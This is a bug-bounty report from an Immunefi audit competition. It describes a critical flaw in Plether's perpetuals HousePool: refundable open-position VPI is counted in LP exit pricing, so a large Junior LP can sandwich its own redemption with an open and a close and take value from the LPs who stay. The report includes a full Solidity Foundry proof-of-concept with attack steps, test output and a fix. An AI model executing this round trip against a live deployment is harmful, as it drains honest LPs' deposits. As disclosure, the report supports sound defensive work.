# \#99103 [SC-Critical] Refundable open VPI is priced into LP exits, letting an exiting Junior LP take value from the Junior LPs who stay

**Submitted on Nov 11th 2026 at 21:48:14 UTC by @vesko210 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99103
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Theft of unclaimed yield

## Description

## Brief/Intro
When a trader opens a position that increases the pool's skew, it pays a VPI charge. HousePool books that charge at once as LP revenue, so Junior equity, and therefore the price LPs are redeemed at, rises immediately. The same position gets the VPI back when it closes, because the close reduces skew and the lifetime clamp lets it recover up to what it paid. LP exit pricing carries no liability for this refundable amount. A Junior LP whose redemption is funded between the open and the close is therefore paid its share of a charge that the Junior LPs who stay later refund. A large Junior LP who also trades can do this on purpose: open just before its redemption epoch, settle the epoch itself through the permissionless Router entry point, then close. In production this lets an exiting LP take value from the remaining Junior LPs on every exit, net of all fees.

## Vulnerability Details
**VPI is booked as LP revenue the moment it is paid.**

`CfdEngineSettlementSidecar.executeOpen` sends the positive trade cost of an open, which is VPI net of the treasury execution fee, to the pool as cash-arrived revenue:

```solidity
// CfdEngineSettlementSidecar.sol
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

`HousePool.recordClaimantInflow` adds it to `accountedAssets`. The next reconcile distributes it through the waterfall, so with Senior at its high-water mark all of it becomes Junior principal. Redemptions funded in that settlement pass are priced on this higher Junior principal.

**The same position takes it back on close.**

`CloseAccountingLib.buildCloseState` computes the close's VPI on the same curve. A close that unwinds the skew the open created gets a rebate, clamped only so that lifetime VPI never goes negative:

```solidity
// CloseAccountingLib.sol
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The VPI paid on the open is thus a refundable deposit, not final revenue. The pool pays the rebate from its cash, so it lowers the equity of whoever holds LP shares at the moment of the close.

**Exit pricing ignores the refund.**

Terminal NAV and the reconcile snapshot count the cash but carry no liability for `max(vpiAccrued, 0)` of open positions. SECURITY.md states the intended property: "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV". It also says that "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". Here a round trip that nets zero VPI for the trader still extracts value, through LP exit timing instead of through the rebate.

**The attack.**

The attacker holds a share h of Junior and trades from the same address (two addresses work the same way).
1. It requests the redemption of its Junior shares. The request matures at the next 1-hour epoch boundary.
2. Shortly before the boundary, it opens a skew-increasing position that pays VPI. Junior equity rises by the VPI.
3. At the boundary, it calls `OrderRouter.settleLpEpoch`. Anyone may call it, and it takes a fresh Pyth update. Its redemption is funded at the inflated Junior price, so it carries away h × VPI.
4. It closes the position. The close returns the VPI to it, less the close execution fee, out of pool cash, so the Junior LPs who stay pay the refund.

For a single open and close, the attacker's net result is h × VPI minus the 4 bps execution fee on each side. Under release parameters (`vpiFactor` 0.01, `maxSkewRatio` 0.4, execution fee 4 bps), filling the skew up to the cap from existing skew s1 on pool depth D is profitable when h × (0.4 + s1/D) > 0.16. That means a Junior share above 40% with no existing skew, or above 32% when skew already sits at 10% of depth. Price exposure lasts only seconds to minutes. Honest open/close pairs that straddle an epoch boundary cause the same transfer with no attacker.

**Why this is not intended.**
- SECURITY.md promises that anticipated VPI does not inflate NAV, and that the lifetime clamp stops extractable round trips. The code comment on the clamp names LP sandwich attacks as the threat it blocks. This attack is an LP sandwich that the clamp does not see.
- The collection-time ownership policy in ACCOUNTING_SPEC.md, which accepts timing transfers, is written for carry only, which is owed for good. VPI on an open is different: the protocol itself refunds it to the same position on close.

## Impact Details
Selected impacts: Direct theft of any user funds (Critical), and Theft of unclaimed yield (High).

- **Direct theft of user funds.** The LPs who stay lose principal, not only yield. In the PoC the honest Junior LP's shares end at 1,996,224 USDG, 3,776 USDG below its own 2,000,000 USDG deposit, while the attacker leaves with 2,752 USDG of profit.
- **Theft of unclaimed yield.** The value the exiting LP carries away is VPI the pool booked as LP revenue. That value belongs to the LPs who are still exposed when the position closes and the pool refunds it.
- **The loss** falls on the Junior LPs who stay, and on Senior only once Junior is exhausted. It equals the attacker's extra redemption, which is the attacker's net profit plus the fees the attacker paid. In the PoC the honest Junior LP ends below its own deposit, so part of the loss is principal, not only yield.
- **The gain to the attacker** is h × VPI minus 8 bps of the traded notional, at no price risk. The PoC shows +2,752 USDG net of every fee on a 10M USDG pool. At a fixed h, the amount scales with pool depth.
- **Repeatability.** Each exit can be sandwiched. A Junior LP can re-deposit (activation at the next hourly epoch, then a 1-hour deposit cooldown) and repeat, so the drain recurs every few hours while the skew cap allows. The PoC demonstrates one cycle.
- **No one else needs to act.** Every step uses public entry points, and the epoch settlement is the permissionless Router call.

In the PoC, the attacker holds 5,000,000 of 7,000,000 USDG of Junior, with 3,000,000 USDG of Senior and 1,000,000 USDG of existing LONG skew. It opens a 2,900,000 USDG LONG two minutes before its redemption epoch, which pays 7,103 USDG of VPI. Its redemption is then paid 5,073 USDG more than in the control run, and the close returns 5,943 USDG (the VPI minus the close fee). The attacker ends 2,752 USDG richer than in the control run, and the honest Junior LP's shares are worth 3,910 USDG less.

## References
- Open VPI booked as cash-arrived LP revenue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L453-L463
- `recordClaimantInflow` adds it to accounted assets: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L652
- Close VPI and the lifetime clamp: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L102-L118
- VPI curve: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L150
- Permissionless Router epoch settlement: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L549-L579
- Redemption funding: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944
- SECURITY.md, "neither anticipated VPI nor its reserve inflates terminal K or symmetric NAV": https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L872
- SECURITY.md, "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips": https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1443

## Recommendation
Treat the positive lifetime VPI of open positions as deferred revenue. Track `Σ max(vpiAccrued, 0)` in the engine, and subtract it from distributable equity in the reconcile snapshot used for LP entry and exit until the position closes or is liquidated. On close or liquidation, release the part the position did not take back as revenue.


## Proof of Concept

## Proof of Concept

**Test file:** `packages/perps/test/perps/poc/OpenVpiExitTransferPoC.t.sol` (create it with the code below)
**Run** (from the repository root): `forge test --root packages/perps --match-path test/perps/poc/OpenVpiExitTransferPoC.t.sol -vv`

The test runs on the project's own Foundry setup (`BasePerpTest`) with the release risk parameters and the release Senior caps, and does not change any in-scope contract. Only Pyth prices and the USDG token are mocked. All trades go through the real order router, the LP epoch is settled through the permissionless `OrderRouter.settleLpEpoch`, and the redemption is requested and claimed through the real `TrancheVault`. The basket price stays at 1.00 throughout, so no trader price PnL is involved.

The test runs the same starting state twice. In the control run the attacker only redeems its Junior shares. In the attacked run it also opens and closes a position around the redemption.

### Steps
**Step 1.** Junior LPs deposit 7,000,000 USDG: 2,000,000 from an honest LP and 5,000,000 from the attacker. A Senior LP deposits 3,000,000 USDG. An unrelated trader holds a 1,000,000 USDG LONG, so the pool already has some skew.

**Step 2.** After the deposit cooldown, the attacker requests the redemption of all its Junior shares. The request matures at the next hourly epoch boundary.

**Step 3 (attacked run only).** Two minutes before the boundary, the attacker opens a 2,900,000 USDG LONG, taking the skew to 3,900,000 (the cap is 40% of depth). The open pays 7,103 USDG of VPI into the pool as LP revenue.

**Step 4.** At the boundary, the attacker calls `OrderRouter.settleLpEpoch` with a fresh price and claims its funded redemption. In the attacked run it receives 5,073 USDG more than in the control run.

**Step 5 (attacked run only).** The attacker closes the LONG. The close returns the VPI, less the close execution fee, from pool cash: 5,943 USDG.

**Step 6.** The test compares both runs: the attacker's total USDG (wallet plus trading account), and the value of the honest Junior LP's shares.

### Code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A skew-increasing open pays positive VPI, which HousePool books at once as cash-arrived LP revenue
///         (CfdEngineSettlementSidecar.executeOpen -> HousePool.recordClaimantInflow(Revenue, CashArrived)). The same
///         position gets that VPI back when it closes (CloseAccountingLib lifetime clamp), paid from pool cash. LP exit
///         pricing carries no liability for that refundable amount, so a Junior LP whose redemption is funded between
///         the open and the close is paid its share of a charge that the remaining Junior LPs later refund.
///
///         The attacker is a large Junior LP that also trades. It opens a skew-increasing LONG just before its
///         redemption epoch, settles the epoch itself through the permissionless OrderRouter.settleLpEpoch, claims
///         the redemption, and closes the LONG. The test runs the same state twice: a control run where the attacker
///         only redeems, and an attacked run with the open/close round trip around the redemption.
///
///         Only Pyth prices (MockPyth) and USDG (MockSettlementToken) are mocked. Every step uses a public entry
///         point: TrancheVault.requestRedeem/claimRedeem, OrderRouter commit/execute, OrderRouter.settleLpEpoch.
///         The basket price is held at 1.00 throughout, so no trader price PnL is involved.
contract OpenVpiExitTransferPoC is BasePerpTest {

    address internal constant KEEPER = address(0xBEEF);
    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant HONEST_JUNIOR = address(0x1E01);
    address internal constant ATTACKER = address(0xA77A);
    address internal constant SKEW_TRADER = address(0xA001);

    uint256 internal constant ATTACK_SIZE = 2_900_000e18; // 2.9M USDG notional at 1.00
    uint256 internal constant ATTACK_MARGIN = 60_000e6;
    uint256 internal constant ATTACKER_TRADING_FUNDS = 100_000e6;

    struct Outcome {
        uint256 attackerWealth; // wallet USDG + clearinghouse balance after the run
        uint256 honestJuniorValue; // value of the honest Junior LP's shares after the run
        uint256 attackerRedeemed; // USDG paid for the attacker's Junior redemption
        uint256 openVpi; // pool cash credited by the attacker's open (VPI net of treasury fee)
        uint256 closeRebate; // pool cash paid back by the attacker's close
        uint256 treasuryFees; // execution fees routed to the treasury
    }

    /// @dev Release risk parameters from packages/perps/DEPLOYMENT.md ("Initial release parameters").
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // Release Senior caps: 40M USDG and 80% of the pool.
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(HONEST_JUNIOR, 2_000_000e6);
        _fundJunior(ATTACKER, 5_000_000e6);
        _fundSenior(SENIOR_LP, 3_000_000e6);

        // Ordinary market state: an unrelated trader already holds 1M of LONG skew.
        _fundTrader(SKEW_TRADER, 100_000e6);
        _trade(SKEW_TRADER, CfdTypes.Side.LONG, 1_000_000e18, 20_000e6, false);

        _fundTrader(ATTACKER, ATTACKER_TRADING_FUNDS);
        // The Junior deposit cooldown has passed before the attacker requests its exit.
        _warpTo(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
    }

    /// @notice Same starting state, same redemption: the round trip around the exit pays the attacker more than it
    ///         costs in fees, and the honest Junior LP who stays loses exactly what the attacker's redemption carried
    ///         away from the refundable VPI.
    function test_OpenVpiCountedAtExitIsRefundedByRemainingJunior() public {
        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _run(false);
        vm.revertToState(snapshot);
        Outcome memory attacked = _run(true);

        uint256 attackerGain = attacked.attackerWealth - control.attackerWealth;
        uint256 honestLoss = control.honestJuniorValue - attacked.honestJuniorValue;
        uint256 extraRedeemed = attacked.attackerRedeemed - control.attackerRedeemed;

        console2.log("[attack] VPI booked as LP revenue on open (USDG):", attacked.openVpi / 1e6);
        console2.log("[attack] VPI refunded by pool on close (USDG)   :", attacked.closeRebate / 1e6);
        console2.log("[attack] treasury execution fees paid (USDG)    :", attacked.treasuryFees / 1e6);
        console2.log("[control] attacker redemption paid (USDG)       :", control.attackerRedeemed / 1e6);
        console2.log("[attack]  attacker redemption paid (USDG)       :", attacked.attackerRedeemed / 1e6);
        console2.log("[result] attacker net gain vs control (USDG)    :", attackerGain / 1e6);
        console2.log("[control] honest Junior value (USDG)            :", control.honestJuniorValue / 1e6);
        console2.log("[attack]  honest Junior value (USDG)            :", attacked.honestJuniorValue / 1e6);
        console2.log("[result] honest Junior loss vs control (USDG)   :", honestLoss / 1e6);

        // The open charged material VPI. The close refunds all of it from pool cash, less the close execution fee
        // that is netted into the rebate (4 bps of notional, documented under Cecuro MED-6).
        uint256 closeFee = (ATTACK_SIZE / 1e12) * 4 / 10_000;
        assertGt(attacked.openVpi, 5000e6, "open pays material VPI into the pool");
        assertApproxEqAbs(attacked.closeRebate + closeFee, attacked.openVpi, 1e6, "close refunds the open VPI");

        // The attacker's redemption was priced with that refundable VPI inside Junior equity.
        assertGt(extraRedeemed, 3000e6, "exit is paid a share of the refundable VPI");

        // Net of every fee it paid, the attacker ends richer than if it had only redeemed.
        assertGt(attacked.attackerWealth, control.attackerWealth, "round trip is net profitable");
        assertGt(attackerGain, 1000e6, "profit is material after fees");

        // The Junior LP that stays pays for all of it: the attacker's net profit plus the fees the attacker paid.
        assertGt(honestLoss, 1000e6, "honest Junior LP loses value");
        assertApproxEqRel(
            honestLoss, attackerGain + attacked.treasuryFees, 0.01e18, "honest loss funds attacker profit and fees"
        );
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Scenario
    // ---------------------------------------------------------------------------------------------------------------

    function _run(
        bool attack
    ) internal returns (Outcome memory outcome) {
        uint256 treasuryBefore = _settlementBalance(engine.protocolTreasury());

        // 1. The attacker queues the redemption of all of its Junior shares (identical in both runs).
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 epochStart = pool.lpEpochStart(requestId);

        // 2. Shortly before the boundary, the attacker opens a skew-increasing LONG (1M -> 3.9M of 0.4 x depth).
        _warpTo(epochStart - 120);
        if (attack) {
            uint256 poolBefore = pool.totalAssets();
            _trade(ATTACKER, CfdTypes.Side.LONG, ATTACK_SIZE, ATTACK_MARGIN, false);
            outcome.openVpi = pool.totalAssets() - poolBefore;
        }

        // 3. At the boundary the attacker settles the LP epoch itself through the permissionless Router entry point.
        _warpTo(epochStart);
        bytes[] memory update = _mockPythUpdateData(1e8);
        uint256 fee = pletherOracle.getUpdateFee(update);
        vm.deal(ATTACKER, fee);
        vm.prank(ATTACKER);
        router.settleLpEpoch{value: fee}(update);

        // 4. The attacker claims its funded redemption.
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        assertEq(claimable, shares, "whole attacker redemption funded");
        vm.prank(ATTACKER);
        outcome.attackerRedeemed = juniorVault.claimRedeem(requestId, claimable, ATTACKER, ATTACKER);

        // 5. The attacker closes the LONG; the lifetime clamp lets the close take the open's VPI back.
        if (attack) {
            uint256 poolBefore = pool.totalAssets();
            _trade(ATTACKER, CfdTypes.Side.LONG, ATTACK_SIZE, 0, true);
            outcome.closeRebate = poolBefore - pool.totalAssets();
        }

        outcome.treasuryFees = _settlementBalance(engine.protocolTreasury()) - treasuryBefore;
        outcome.attackerWealth = settlementToken.balanceOf(ATTACKER) + _settlementBalance(ATTACKER);
        outcome.honestJuniorValue = juniorVault.convertToAssets(juniorVault.balanceOf(HONEST_JUNIOR));
    }

    // ---------------------------------------------------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------------------------------------------------

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        if (block.timestamp < timestamp) {
            vm.warp(timestamp);
        }
    }

}
```

### Output

```
Ran 1 test for test/perps/poc/OpenVpiExitTransferPoC.t.sol:OpenVpiExitTransferPoC
[PASS] test_OpenVpiCountedAtExitIsRefundedByRemainingJunior() (gas: 6025907)
Logs:
  [attack] VPI booked as LP revenue on open (USDG): 7103
  [attack] VPI refunded by pool on close (USDG)   : 5943
  [attack] treasury execution fees paid (USDG)    : 1160
  [control] attacker redemption paid (USDG)       : 5000337
  [attack]  attacker redemption paid (USDG)       : 5005410
  [result] attacker net gain vs control (USDG)    : 2752
  [control] honest Junior value (USDG)            : 2000134
  [attack]  honest Junior value (USDG)            : 1996224
  [result] honest Junior loss vs control (USDG)   : 3910

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.29ms (4.98ms CPU time)
```

### Output vs expected
The open pays 7,103 USDG of VPI, and Junior equity rises by that amount at once. The attacker's redemption is priced on it and paid 5,073 USDG more than in the control run. The close then refunds the VPI from pool cash, less the close fee. Net of the 1,160 USDG open fee and the 1,160 USDG close fee, the attacker ends 2,752 USDG richer than if it had only redeemed. The honest Junior LP's shares are worth 3,910 USDG less, which is exactly the attacker's profit plus the fee paid to the treasury. That leaves the honest LP below its own 2,000,000 USDG deposit.

Expected: a trading round trip that pays and recovers the same VPI should leave LP value unchanged for the LPs who stay. An LP exit should not be priced on a charge that the pool will refund to the same position.
